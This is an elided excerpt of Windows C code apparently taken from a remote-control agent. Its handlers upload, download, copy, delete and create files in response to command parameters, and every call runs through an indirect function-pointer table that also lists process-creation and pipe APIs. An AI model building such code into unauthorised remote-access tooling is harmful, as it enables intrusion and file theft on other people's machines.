...
void UploadFile(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    ...
    *pOutputDataLength = 1;
    ...
    if (*commandPara == '0') {
        if (((pFopen_s)pFuncAddr[17])(&file, commandPara + 1, (char*)modeWB)) {
            return;
        }
    }
    else {
        if (((pFopen_s)pFuncAddr[17])(&file, commandPara + 1, (char*)modeAB)) {
            return;
        }
    }

    int headLength = 1 + ((pStrlen)pFuncAddr[3])(commandPara + 1) + 1;
    if ((((pFwrite)pFuncAddr[20])(commandPara + headLength, 1, commandParaLength - headLength, file)) != commandParaLength - headLength) {
        ((pFclose)pFuncAddr[21])(file);
        return;
    }
    ((pFclose)pFuncAddr[21])(file);
    **pOutputData = '1';
...
void DownloadFile(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    ...
    *pOutputDataLength = 0;
    ...
    if (((pFopen_s)pFuncAddr[17])(&file, filePath, (char*)modeRB)) {
        return;
    }
    unsigned long long int readIndex = ((pStrtoull)pFuncAddr[16])(filePath + ((pStrlen)pFuncAddr[3])(filePath) + 1, NULL, 10);
    ((p_Fseeki64)pFuncAddr[18])(file, readIndex, SEEK_SET);
    *pOutputDataLength = ((pFread)pFuncAddr[19])(*pOutputData, 1, readLength, file);
    ((pFclose)pFuncAddr[21])(file);
}
...
void PasteFile(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    ...
    *pOutputDataLength = 1;
    ...
    if (*commandPara == '0') {
        if (!((pRename)(pFuncAddr[23]))(commandPara + 1, newPath)) {
            **pOutputData = '1';
        }
    }
    else {
        if (((pCopyFileA)(pFuncAddr[22]))(commandPara + 1, newPath, TRUE)) {
            **pOutputData = '1';
        }
    }
}
...
void DeleteFile_(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    ...
    *pOutputDataLength = 1;
    ...
    if (!((pRemove)(pFuncAddr[24]))(commandPara)) {
        **pOutputData = '1';
    }
}
...
void CreateFolder(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* pFuncAddr) {
    ...
    *pOutputDataLength = 1;
    ...
    if (((pCreateDirectoryA)(pFuncAddr[25]))(commandPara, NULL)) {
        **pOutputData = '1';
    }
}
...
int main() {
    ...
    PVOID funcAddr[] = { malloc, realloc, free, strlen, strtol, ((errno_t(*)(char*, rsize_t, const char*))strcpy_s), ((int(*)(char*, size_t, const char*, ...))sprintf_s), CloseHandle, CreateProcessA, CreatePipe, ReadFile, FindFirstFileA, FindNextFileA, FindClose, GetFullPathNameA, FileTimeToSystemTime, strtoull, fopen_s, _fseeki64, fread, fwrite, fclose, CopyFileA, rename, ((int(*)(const char*))remove), CreateDirectoryA };
